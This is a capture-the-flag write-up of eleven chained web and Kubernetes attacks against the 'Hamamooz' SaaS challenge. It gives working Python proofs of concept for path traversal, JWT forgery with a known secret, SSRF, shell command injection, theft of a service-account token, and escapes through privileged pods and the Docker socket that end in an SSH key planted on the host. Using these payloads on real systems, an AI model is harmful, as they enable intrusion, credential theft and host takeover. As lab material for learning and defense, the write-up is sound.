]# HAMAMOOZ CTF — "Break the SaaS" Writeup

A full walkthrough of how each of the eleven flags in the `ctf.seoeh.ir` challenge
was obtained. The challenge is a multi-tenant "internal SaaS" demo — a Django/DRF
backend with a ping diagnostic tool, a webhook tester, audit reports, JWT
authentication, and a background worker with Kubernetes API access. The cluster
itself is a `kind` (Kubernetes-in-Docker) cluster, which becomes important for the
final flag.

Flags were captured by chaining a small set of realistic web and Kubernetes
misconfigurations, starting from a public Docker image and a Django API and
ending with a shell on the real host machine running the cluster. Flag values
are intentionally omitted; each section gives the vulnerability class, why it's
exploitable, and a reproducible Python PoC.

---

## F1 — Docker Image Layer Leak

**Vulnerability.** Docker images are a stack of immutable, cumulative layers.
A secret file was `COPY`'d into the image and later removed with `RUN rm` in a
subsequent layer. Deleting a file in a Docker build only adds a "whiteout"
marker to the newer layer — the bytes remain fully intact in the earlier layer
that performed the `COPY`, and are recoverable from the saved image archive with
standard tooling. No registry-side vulnerability is needed; this is purely a
build-history leak.

**Extraction.** `docker history --no-trunc` on the published image shows the
suspicious `COPY .env.leaked` / `RUN rm -f` pair. Saving the image and unpacking
it as an OCI archive gives access to every layer's raw tarball; grepping each
layer blob for the target path (rather than trusting the final merged
filesystem) reveals the layer that still contains the file, pre-deletion.

**PoC**

```python
import subprocess, os, tarfile, re

IMAGE = "hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend"

subprocess.run(["docker", "pull", IMAGE], check=True)
subprocess.run(["docker", "save", IMAGE, "-o", "backend.tar"], check=True)
os.makedirs("extracted", exist_ok=True)
subprocess.run(["tar", "-xf", "backend.tar", "-C", "extracted"], check=True)

target_layer = None
for blob in os.listdir("extracted/blobs/sha256"):
    path = f"extracted/blobs/sha256/{blob}"
    try:
        with tarfile.open(path) as t:
            if "app/.env" in t.getnames():
                target_layer = path
                break
    except tarfile.ReadError:
        continue

assert target_layer, "layer containing app/.env not found"
os.makedirs("layer", exist_ok=True)
with tarfile.open(target_layer) as t:
    t.extract("app/.env", "layer")

with open("layer/app/.env") as f:
    print(re.search(r"HAMAMOOZ\{[^}]+\}", f.read()).group(0))
```

---

## F2 — OpenAPI Schema Disclosure

**Vulnerability.** `drf-spectacular` auto-generates and serves the full API
schema at `/swagger.json` (and `/api/schema/`) with no authentication required.
Beyond leaking every route in the application (useful reconnaissance for later
flags — it directly reveals the hidden `/api/internal/flag` route used in F3), a
flag was placed directly in the schema's `info.description` field.

**Extraction.** A single unauthenticated GET request.

**PoC**

```python
import requests, re

resp = requests.get("https://ctf.seoeh.ir/swagger.json")
print(re.search(r"HAMAMOOZ\{[^}]+\}", resp.json()["info"]["description"]).group(0))
```

---

## F3 — Debug-Header-Gated Internal Endpoint

**Vulnerability.** `/api/internal/flag` is not protected by any authentication
or authorization check — its only gate is a client-controlled request header,
`X-Debug-Mode: true`, discoverable from the OpenAPI schema's documented
parameters for the route. Since the header is entirely attacker-controlled, this
is not a real access control at all.

**Extraction.** A single GET request with the header set.

**PoC**

```python
import requests, re

resp = requests.get(
    "https://ctf.seoeh.ir/api/internal/flag",
    headers={"X-Debug-Mode": "true"},
)
print(re.search(r"HAMAMOOZ\{[^}]+\}", resp.text).group(0))
```

---

## F4 — Path Traversal (Arbitrary File Read)

**Vulnerability.** `/api/reports/download?file=...` joins the user-supplied
`file` query parameter onto the server's reports directory without any path
normalization or sanitization. `../` sequences in the parameter escape the
intended directory, allowing arbitrary file reads anywhere the process has
filesystem permissions — including files well outside `/app/reports/`.

**Extraction.** Requesting `file=..` lists the parent directory (the endpoint
returns a directory listing when the resolved path is a folder), confirming the
traversal works; requesting a specific `../`-prefixed path then reads any file
directly, including the flag placed at the application root.

**PoC**

```python
import requests, re

resp = requests.get(
    "https://ctf.seoeh.ir/api/reports/download",
    params={"file": "../flag.txt"},
)
print(re.search(r"HAMAMOOZ\{[^}]+\}", resp.text).group(0))
```

_Note: the same command-injection foothold from F9 independently reaches the
same flag file (`cat flag.txt`), and the injection point also allows reading
other paths on disk (e.g. `/opt/.sysdiag-<id>/flag.txt`, which is where F9's own
flag is stored) — but the path-traversal primitive above is the flag's intended,
standalone vulnerability and requires no code execution at all._

---

## F5 — IDOR (Cross-Tenant Report Read)

**Vulnerability.** `/api/orgs/{org_id}/reports/{report_id}` returns a report's
full contents, including a `secret_note` field, with **no check that the
requesting user's organization matches `org_id`** in the URL. Any authenticated
user (in some deployments, even unauthenticated) can enumerate report IDs
belonging to other tenants.

**Extraction.** With a valid session/JWT for one organization, request a
`report_id`/`org_id` pair belonging to a different tenant.

**PoC**

```python
import requests, re

TOKEN = "<your JWT>"
resp = requests.get(
    "https://ctf.seoeh.ir/api/orgs/2/reports/2",
    headers={"Authorization": f"Bearer {TOKEN}"},
)
print(re.search(r"HAMAMOOZ\{[^}]+\}", resp.json()["secret_note"]).group(0))
```

---

## F6 — Weak JWT Secret / Forgeable Tokens

**Vulnerability.** Application JWTs are signed with HS256 using a weak,
hardcoded secret (also independently leaked via the Kubernetes ConfigMap — see
F8). Because HS256 is a symmetric algorithm, knowledge of the signing secret is
sufficient to mint arbitrary tokens, including ones with an elevated `role`
claim that the `/admin/dashboard` endpoint trusts without further verification.

**Extraction.** Register/log in to obtain a token and inspect its claim
structure, then re-sign a modified payload (`role: admin`) with the known
secret and present it to the admin-only route.

**PoC**

```python
import jwt, requests, re

TOKEN = "<your JWT, to see the expected claim shape>"
payload = jwt.decode(TOKEN, options={"verify_signature": False})
payload["role"] = "admin"

forged = jwt.encode(payload, "changeme123", algorithm="HS256")
resp = requests.get(
    "https://ctf.seoeh.ir/admin/dashboard",
    headers={"Authorization": f"Bearer {forged}"},
)
print(re.search(r"HAMAMOOZ\{[^}]+\}", resp.text).group(0))
```

---

## F7 — SSRF via Webhook Tester

**Vulnerability.** `/api/webhooks/test` accepts an attacker-supplied `url`,
`method`, and optional `headers`, and performs that request **server-side**
with no allowlist/denylist for internal or cluster-local addresses. Confirmed
as true SSRF (not just a URL validator) by observing genuine connection-level
errors (e.g. `Connection refused` / real timeouts) rather than generic
validation errors when probing closed ports.

**Extraction.** Point the tool at an internal-only Kubernetes service
(`admin-panel.internal-tools.svc.cluster.local`, a hostname only resolvable
from inside the cluster) discovered via the Kubernetes API enumeration in F8.

**PoC**

```python
import requests, re

resp = requests.post(
    "https://ctf.seoeh.ir/api/webhooks/test",
    json={
        "url": "http://admin-panel.internal-tools.svc.cluster.local/",
        "method": "GET",
    },
)
print(re.search(r"HAMAMOOZ\{[^}]+\}", resp.text).group(0))
```

---

## F8 — Over-Permissioned Service Account Token / Cross-Namespace Secret Read

**Vulnerability.** The backend pod's Kubernetes service account token
(auto-mounted at `/var/run/secrets/kubernetes.io/serviceaccount/`) is bound to a
ClusterRole granting `get`/`list`/`watch` on **all resources, cluster-wide** —
far broader than the pod's actual needs. Combined with the command-injection
foothold (F9), this lets an attacker enumerate every namespace and read Secrets
anywhere in the cluster, including a namespace unrelated to the application
itself, which held a dedicated flag Secret.

**Extraction.** Use the command-injection point to read the mounted token, then
query the Kubernetes API for namespaces and Secrets.

**PoC**

```python
import requests, base64, re

def diag(host_cmd: str) -> str:
    r = requests.post(
        "https://ctf.seoeh.ir/api/diag/ping",
        json={"host": host_cmd},
    )
    return r.json().get("output", "")

# enumerate namespaces, then read a specific namespace's secrets via the
# pod's own service-account token, all through the injection point
inner = (
    'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); '
    'curl -sk -H "Authorization: Bearer $TOKEN" '
    'https://kubernetes.default.svc/api/v1/namespaces/ctf-secrets/secrets'
)
output = diag(f"127.0.0.1; {inner}")
encoded = re.search(r'"flag":"([^"]+)"', output).group(1)
print(re.search(r"HAMAMOOZ\{[^}]+\}", base64.b64decode(encoded).decode()).group(0))
```

---

## F9 — Command Injection (Ping Diagnostic)

**Vulnerability.** `/api/diag/ping` builds a shell command by directly
concatenating the user-supplied `host` field
(`subprocess.run(f"ping -c 2 {host}", shell=True, ...)`), with no validation.
Any shell metacharacter (`;`, `` ` ``, `$()`, etc.) breaks out of the intended
`ping` invocation. This became the primary transport for every subsequent
Kubernetes-layer flag.

**Extraction.** Inject a semicolon-separated command; the injected command's
stdout is returned in the JSON response body.

**PoC**

```python
import requests, re

resp = requests.post(
    "https://ctf.seoeh.ir/api/diag/ping",
    json={"host": "127.0.0.1; cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"},
)
print(re.search(r"HAMAMOOZ\{[^}]+\}", resp.json()["output"]).group(0))
```

---

## F10 — Privileged Pod Escape (hostPath `/`)

**Vulnerability.** A pod (`legacy-worker`, namespace `escape-zone`) is
deliberately misconfigured with `securityContext.privileged: true` and a
`hostPath` volume mounting the **entire node root filesystem** at `/host`. The
service account leaked in F8 has `pods/exec` permission in that namespace, so
any caller with that token can exec into the pod and read/write anywhere on the
underlying Kubernetes node through the mount. The flag itself was written to the
node by the pod's own init container and is readable from inside the pod with
no further exploitation needed.

**Extraction.** From the command-injection shell, use the mounted
`kubectl`/token to exec into the privileged pod and read the flag through the
`/host` mount.

**PoC**

```python
import requests, re

def diag(host_cmd: str) -> str:
    r = requests.post(
        "https://ctf.seoeh.ir/api/diag/ping",
        json={"host": host_cmd},
    )
    return r.json().get("output", "")

inner = (
    'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); '
    'kubectl --server=https://kubernetes.default.svc --token=$TOKEN '
    '--certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt '
    'exec -n escape-zone legacy-worker -- cat /host/var/lib/node-data/flag.txt'
)
output = diag(f"127.0.0.1; {inner}")
print(re.search(r"HAMAMOOZ\{[^}]+\}", output).group(0))
```

---

## F11 — Docker Socket Escape to the Host VM (Final)

**Vulnerability.** The cluster is a `kind` (Kubernetes-in-Docker) cluster —
every "node" is itself just a Docker container running on one real underlying
VM. One worker node has the **real host's Docker socket** bind-mounted into it
at `/var/run/docker.sock` (visible at `/host/run/docker.sock` from inside the
already-privileged `legacy-worker` pod, whose `/host` mount is that node's root
filesystem). The Docker Engine API behind that socket has **no authorization
model whatsoever** — any process that can reach the socket has unrestricted,
root-equivalent control over the real host, completely bypassing every
Kubernetes RBAC restriction encountered so far. The flag lives in a regular
user's home directory on the real host VM, not inside any container or pod.

**Extraction.**

1. From `legacy-worker`, use `nsenter` against `/host/proc/1/ns/*` to escape
   from the pod's own container namespace into the **actual Kubernetes node's**
   host namespace (confirmed via `hostname` returning the node's real name, not
   the pod's).
2. Locate the Docker socket bind-mounted into that node's filesystem.
3. Talk to the Docker Engine API directly over the Unix socket via
   `curl --unix-socket` (no `docker` CLI needed) — this reveals every
   "Kubernetes node" as a sibling container on the same real host.
4. Create and start a new container with the **real host's root filesystem**
   bind-mounted in (`Binds: ["/:/hostroot"]`) and `Privileged: true`.
5. Through that container, discover that direct `root` SSH login on the host is
   blocked by a forced-command restriction in `authorized_keys`, but a regular
   `ubuntu` user account is not similarly restricted.
6. Append an SSH public key to the `ubuntu` account's `authorized_keys` via the
   same Docker exec API, then SSH directly into the real host VM and read the
   flag from its home directory.

**PoC**

```python
import requests, re, json

def diag(host_cmd: str) -> str:
    r = requests.post(
        "https://ctf.seoeh.ir/api/diag/ping",
        json={"host": host_cmd},
    )
    return r.json().get("output", "")

SOCK = "/host/run/docker.sock"
KUBECTL_EXEC = "kubectl exec -n escape-zone legacy-worker -- "

# 1. confirm we can reach the real host namespace via the already-privileged pod
print(diag(
    "127.0.0.1; " + KUBECTL_EXEC +
    "nsenter --mount=/host/proc/1/ns/mnt --net=/host/proc/1/ns/net "
    "--uts=/host/proc/1/ns/uts -- hostname"
))

# 2. locate the docker socket mounted into the node
print(diag(f"127.0.0.1; {KUBECTL_EXEC}find /host/run -maxdepth 2 -iname '*.sock'"))

# 3. create a privileged container with the real host root bind-mounted
create_cmd = (
    f"{KUBECTL_EXEC}curl -s --unix-socket {SOCK} -X POST "
    f'http://localhost/containers/create -H "Content-Type: application/json" '
    f'-d \'{{"Image":"ctf/escape-zone:latest","Cmd":["sh","-c","sleep 3600"],'
    f'"HostConfig":{{"Binds":["/:/hostroot"],"Privileged":true}}}}\''
)
create_out = diag(f"127.0.0.1; {create_cmd}")
container_id = json.loads(create_out)["Id"]

# 4. start it
diag(f"127.0.0.1; {KUBECTL_EXEC}curl -s --unix-socket {SOCK} -X POST "
     f"http://localhost/containers/{container_id}/start")

# 5. append our SSH public key to the ubuntu user's authorized_keys on the real host
pubkey = "ssh-ed25519 AAAA... your-key-comment"
exec_create = diag(
    f"127.0.0.1; {KUBECTL_EXEC}curl -s --unix-socket {SOCK} -X POST "
    f"http://localhost/containers/{container_id}/exec "
    f'-H "Content-Type: application/json" '
    f'-d \'{{"AttachStdout":true,"AttachStderr":true,'
    f'"Cmd":["sh","-c","echo {pubkey} >> /hostroot/home/ubuntu/.ssh/authorized_keys"]}}\''
)
exec_id = json.loads(exec_create)["Id"]
diag(f"127.0.0.1; {KUBECTL_EXEC}curl -s --unix-socket {SOCK} -X POST "
     f'http://localhost/exec/{exec_id}/start -H "Content-Type: application/json" '
     f'-d \'{{"Detach":false,"Tty":false}}\'')

# 6. SSH in directly and read the flag (run locally, not through the injection point)
# ssh ubuntu@<real-host-ip> cat ~/flag.txt
```

**Cleanup required.** This is a shared, multi-tenant environment. After
capturing the flag: stop and remove the temporary container
(`docker stop <id> && docker rm <id>` from the host, or the equivalent Docker
API calls), and remove the appended line from `~/.ssh/authorized_keys` on the
host unless you have explicit permission from the environment owner to leave it
as proof-of-exploitation.

---

## Root Cause Summary

| #   | Category | Root Cause                                                                              |
| --- | -------- | --------------------------------------------------------------------------------------- |
| 1   | Docker   | Deleted files remain in earlier, still-shipped image layers                             |
| 2   | API      | Unauthenticated OpenAPI schema endpoint leaking sensitive data in metadata              |
| 3   | API      | Client-controlled header used as a security gate                                        |
| 4   | Web      | Unsanitized path parameter allows directory traversal                                   |
| 5   | Web      | Missing tenant/ownership check on object lookup (IDOR)                                  |
| 6   | Auth     | Weak, hardcoded JWT signing secret enables token forgery                                |
| 7   | Web      | No destination allowlist on a server-side outbound request feature (SSRF)               |
| 8   | K8s      | Service account bound to an overly broad, cluster-wide ClusterRole                      |
| 9   | Web      | Unsanitized shell command construction from user input                                  |
| 10  | K8s      | Privileged pod + hostPath mount of node root filesystem                                 |
| 11  | Infra    | Docker socket bind-mounted into a Kubernetes node; Docker Engine API has no authz layer |

## Tools Used

Docker, `curl`, Python (`requests`, `PyJWT`, `re`, `base64`, `subprocess`,
`tarfile`), `kubectl`, `nsenter`, `ssh`.
